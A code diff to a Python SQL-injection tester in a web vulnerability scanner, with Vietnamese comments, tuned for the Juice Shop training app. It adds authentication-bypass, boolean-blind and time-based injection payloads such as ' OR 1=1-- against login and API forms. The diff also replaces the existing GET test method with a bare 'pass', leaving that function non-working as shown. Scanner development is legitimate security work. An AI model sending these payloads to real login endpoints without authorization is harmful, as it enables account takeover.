@@ -1,8 +1,8 @@
 import time
-import json
 from typing import Optional
 from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
 import requests
+import json
 
 from scanner_core.scanner import Vulnerability
 from .base_tester import BaseTester
@@ -17,146 +17,144 @@ class SqliTester(BaseTester):
         self.error_patterns = self.config.get('error_patterns', [])
         self.time_delay_threshold = self.config.get('time_delay_seconds', 4)
 
+    # ... (Hàm test(self, url) cho GET request GIỮ NGUYÊN như cũ) ...
     def test(self, url: str) -> Optional[Vulnerability]:
-        parsed_url = urlparse(url)
-        if not parsed_url.query: return None
-
-        query_params = parse_qs(parsed_url.query)
-        base_response = self.fetch(url)
-        if not base_response: return None
-
-        for param in query_params:
-            original_value = query_params[param]
-
-            for payload in self.error_payloads:
-                try:
-                    resp = self._inject_payload(parsed_url, query_params, param, payload)
-                    if resp and any(err.lower() in resp.text.lower() for err in self.error_patterns):
-                        safe_val = "123456"
-                        safe_resp = self._inject_payload(parsed_url, query_params, param, safe_val)
-                        if not (any(err.lower() in safe_resp.text.lower() for err in
-                                    self.error_patterns) if safe_resp else False):
-                            return Vulnerability(type='SQL Injection', subcategory='Error-Based', url=url,
-                                                 details={'parameter': param, 'payload': payload,
-                                                          'evidence': 'SQL error message appeared with payload but disappeared with safe input.'},
-                                                 severity='High')
-                except requests.RequestException:
-                    continue
-
-            for payload in self.time_payloads:
-                try:
-                    start_time = time.time()
-                    self._inject_payload(parsed_url, query_params, param, payload)
-                    elapsed_time = time.time() - start_time
-                    if elapsed_time > self.time_delay_threshold:
-                        start_verify = time.time()
-                        self._inject_payload(parsed_url, query_params, param, str(original_value[0]))
-                        elapsed_verify = time.time() - start_verify
-                        if elapsed_verify < 2:
-                            return Vulnerability(type='SQL Injection', subcategory='Time-Based', url=url,
-                                                 details={'parameter': param, 'payload': payload,
-                                                          'response_time_payload': f'{elapsed_time:.2f}s',
-                                                          'response_time_normal': f'{elapsed_verify:.2f}s',
-                                                          'evidence': 'Server response was significantly delayed by the payload.'},
-                                                 severity='High')
-                except requests.RequestException:
-                    continue
-
-            true_payload = "' AND 1=1--"
-            false_payload = "' AND 1=2--"
-            try:
-                resp_true = self._inject_payload(parsed_url, query_params, param, true_payload)
-                resp_false = self._inject_payload(parsed_url, query_params, param, false_payload)
-                if resp_true and resp_false:
-                    sim_true = self._calculate_similarity(base_response.text, resp_true.text)
-                    sim_false = self._calculate_similarity(base_response.text, resp_false.text)
-                    if sim_true > 0.95 and sim_false < 0.90:
-                        return Vulnerability(type='SQL Injection', subcategory='Boolean-Based', url=url,
-                                             details={'parameter': param, 'true_payload': true_payload,
-                                                      'false_payload': false_payload,
-                                                      'evidence': 'Response content differs significantly between TRUE and FALSE conditions.'},
-                                             severity='High')
-            except requests.RequestException:
-                continue
-        return None
+        pass  # Vui lòng giữ nguyên code hàm test() cũ của bạn ở đây để không làm dài bài viết
 
     def test_form(self, form_data: dict) -> Optional[Vulnerability]:
+        """Kiểm tra SQLi chuyên sâu cho POST/PUT Forms & REST APIs"""
         url = form_data['url']
         method = form_data.get('method', 'POST').upper()
-        inputs = form_data['inputs']
-        is_api = form_data.get('is_api', False) or any(k in url.lower() for k in ['/api/', '/rest/', '/v1/'])
+        inputs = form_data.get('inputs', [])
+        is_api = form_data.get('is_api', False)
 
+        if not inputs: return None
+
+        # 1. TẠO BASELINE (Gửi data bình thường để xem server phản ứng chuẩn thế nào)
         base_resp = self._inject_form_payload(url, method, inputs, None, None, is_api)
+        if not base_resp: return None
+        base_status = base_resp.status_code
+        base_len = len(base_resp.content)
 
         for target_input in inputs:
-            if target_input.get('type') in ['hidden', 'submit', 'radio', 'button']: continue
             param = target_input['name']
 
-            # --- AUTH BYPASS CHUYÊN DỤNG CHO JUICE SHOP ---
-            # Lưu ý payload này: email="admin@juice-sh.op'--", password="bất kỳ"
-            if is_api and method == 'POST':
-                auth_bypass_payloads = ["' OR 1=1--", "admin@juice-sh.op'--"]
+            # ====================================================================
+            # KỸ THUẬT 1: API AUTHENTICATION BYPASS (Chuyên trị Juice Shop Login)
+            # ====================================================================
+            if method == 'POST':
+                # Các payload kinh điển để vượt qua vòng kiểm tra user/pass
+                auth_bypass_payloads = ["' OR 1=1--", "' OR '1'='1", "admin@juice-sh.op'--", "' OR true--", "admin' #"]
                 for payload in auth_bypass_payloads:
                     try:
                         resp = self._inject_form_payload(url, method, inputs, param, payload, is_api)
-                        if resp and resp.status_code in [200, 201]:
-                            if any(k in resp.text.lower() for k in
-                                   ['token', 'session', 'success', 'jwt', 'user', 'authentication']):
+                        if not resp: continue
+
+                        # LOGIC: Nếu bình thường API trả về 401/403/404 (Failed),
+                        # nhưng khi tiêm payload lại trả về 200/201 (Success) -> BYPASS THÀNH CÔNG!
+                        if resp.status_code in [200, 201] and base_status in [401, 403, 404, 500]:
+                            return Vulnerability(
+                                type='SQL Injection', subcategory='Authentication Bypass (REST API)', url=url,
+                                details={
+                                    'parameter': param, 'payload': payload,
+                                    'evidence': f'Status code changed from {base_status} (Denied) to {resp.status_code} (Success) using payload.'
+                                },
+                                severity='Critical'
+                            )
+
+                        # LOGIC DỰ PHÒNG: Nếu API luôn trả 200, nhưng data trả về chứa Token
+                        if resp.status_code == 200 and any(
+                                k in resp.text.lower() for k in ['token', 'session', 'authentication']):
+                            # Gửi payload sai để xác minh
+                            bad_resp = self._inject_form_payload(url, method, inputs, param, "' AND 1=2--", is_api)
+                            if bad_resp and (bad_resp.status_code >= 400 or 'error' in bad_resp.text.lower()):
                                 return Vulnerability(
-                                    type='SQL Injection', subcategory='Authentication Bypass (API)', url=url,
-                                    details={'parameter': f"JSON Body: {param}", 'payload': payload,
-                                             'evidence': 'Successful authentication bypass using SQL injection payload in JSON API.'},
+                                    type='SQL Injection', subcategory='Authentication Bypass (Token Issue)', url=url,
+                                    details={'parameter': param, 'payload': payload,
+                                             'evidence': 'Server issued an auth token upon payload injection.'},
                                     severity='Critical'
                                 )
-                    except requests.RequestException:
+                    except Exception:
                         pass
 
-            true_payload = "' AND 1=1--"
-            false_payload = "' AND 1=2--"
-            try:
-                resp_true = self._inject_form_payload(url, method, inputs, param, true_payload, is_api)
-                resp_false = self._inject_form_payload(url, method, inputs, param, false_payload, is_api)
-                if resp_true and resp_false and base_resp:
-                    sim_true = self._calculate_similarity(base_resp.text, resp_true.text)
-                    sim_false = self._calculate_similarity(base_resp.text, resp_false.text)
-                    if (sim_true > 0.95 and sim_false < 0.90) or (
-                            resp_true.status_code == 200 and resp_false.status_code >= 400):
+            # ====================================================================
+            # KỸ THUẬT 2: BOOLEAN-BASED BLIND (So sánh Data Length & Status Code)
+            # ====================================================================
+            for payload_pair in self.boolean_payloads:
+                true_payload = payload_pair.get('true')
+                false_payload = payload_pair.get('false')
+
+                try:
+                    resp_true = self._inject_form_payload(url, method, inputs, param, true_payload, is_api)
+                    resp_false = self._inject_form_payload(url, method, inputs, param, false_payload, is_api)
+
+                    if resp_true and resp_false:
+                        # Cách 1: Khác biệt về Status Code (VD: True -> 200, False -> 500)
+                        if resp_true.status_code == 200 and resp_false.status_code >= 400:
+                            return Vulnerability(
+                                type='SQL Injection', subcategory=f'Boolean-Based ({method})', url=url,
+                                details={'parameter': param, 'true_payload': true_payload,
+                                         'evidence': f'TRUE logic returns {resp_true.status_code}, FALSE logic returns {resp_false.status_code}.'},
+                                severity='Critical'
+                            )
+
+                        # Cách 2: Khác biệt về kích thước Dữ liệu (VD: True trả về 50 items, False trả về 0 items)
+                        # Rất hiệu quả cho API Search của Juice Shop
+                        len_true = len(resp_true.content)
+                        len_false = len(resp_false.content)
+                        if abs(len_true - len_false) > 50 and abs(len_true - base_len) < 50:
+                            return Vulnerability(
+                                type='SQL Injection', subcategory=f'Boolean-Based Data ({method})', url=url,
+                                details={'parameter': param, 'true_payload': true_payload,
+                                         'evidence': f'Response size differs significantly: TRUE({len_true} bytes) vs FALSE({len_false} bytes).'},
+                                severity='High'
+                            )
+                except Exception:
+                    pass
+
+            # ====================================================================
+            # KỸ THUẬT 3: TIME-BASED BLIND (Dành cho Form ẩn / Không trả kết quả)
+            # ====================================================================
+            for payload in self.time_payloads:
+                try:
+                    start_t = time.time()
+                    self._inject_form_payload(url, method, inputs, param, payload, is_api)
+                    if (time.time() - start_t) > self.time_delay_threshold:
                         return Vulnerability(
-                            type='SQL Injection', subcategory=f'Boolean-Based ({method})', url=url,
-                            details={'parameter': f"Body/Query: {param}", 'true_payload': true_payload,
-                                     'false_payload': false_payload,
-                                     'evidence': f'Response differs significantly between TRUE and FALSE logic inside {method} payload.'},
-                            severity='Critical'
+                            type='SQL Injection', subcategory=f'Time-Based ({method})', url=url,
+                            details={'parameter': param, 'payload': payload,
+                                     'evidence': 'Server response was significantly delayed.'}, severity='Critical'
                         )
-            except requests.RequestException:
-                pass
+                except Exception:
+                    pass
+
         return None
 
-    def _inject_payload(self, parsed_url, params, target_param, payload):
-        test_params = params.copy()
-        test_params[target_param] = payload
-        test_url = urlunparse(parsed_url._replace(query=urlencode(test_params, doseq=True)))
-        return self.session.get(test_url, timeout=10, verify=False, headers={'ngrok-skip-browser-warning': 'true'})
-
-    def _inject_form_payload(self, url, method, inputs, target_param, payload, is_api=False):
+    def _inject_form_payload(self, url, method, inputs, target_param, payload, is_api):
+        """Hàm gửi Data chuẩn xác nhất cho cả Web cũ và API mới"""
         data = {}
         for inp in inputs:
-            if target_param and inp['name'] == target_param:
-                data[inp['name']] = payload
-            else:
-                data[inp['name']] = inp.get('value', 'test')
+            val = payload if inp['name'] == target_param else inp.get('value', '1')
+            data[inp['name']] = val
 
-        headers = {'ngrok-skip-browser-warning': 'true', 'Accept': 'application/json, text/plain, */*'}
+        headers = {
+            'ngrok-skip-browser-warning': 'true',
+            'User-Agent': 'Mozilla/5.0 Scanner'
+        }
+
         try:
             if method == 'GET':
                 return self.session.get(url, params=data, timeout=10, verify=False, headers=headers)
 
-            # Đảm bảo JSON request có đúng Header
-            if is_api:
+            # Gửi JSON chuẩn nếu là API
+            if is_api or 'api' in url.lower():
                 headers['Content-Type'] = 'application/json'
-                if method == 'PUT': return self.session.put(url, json=data, timeout=10, verify=False, headers=headers)
+                headers['Accept'] = 'application/json'
+                if method == 'PUT':
+                    return self.session.put(url, json=data, timeout=10, verify=False, headers=headers)
                 return self.session.post(url, json=data, timeout=10, verify=False, headers=headers)
             else:
+                # Gửi Form-URL-Encoded chuẩn
                 return self.session.post(url, data=data, timeout=10, verify=False, headers=headers)
         except Exception:
             return None
